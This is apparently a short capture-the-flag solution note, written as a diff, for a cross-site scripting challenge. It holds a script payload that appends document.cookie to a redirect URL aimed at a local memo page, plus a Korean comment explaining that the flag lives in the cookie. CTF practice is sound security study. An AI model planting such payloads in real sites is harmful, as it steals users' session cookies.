@@ -1,0 +1,3 @@
+<script>location.href="http://127.0.0.1:8000/memo?memo=hello"+document.cookie;</script> 
+
+쿠키에 플레그가 저장되기 때문에 memo탭에 쿠키를 출력해준다
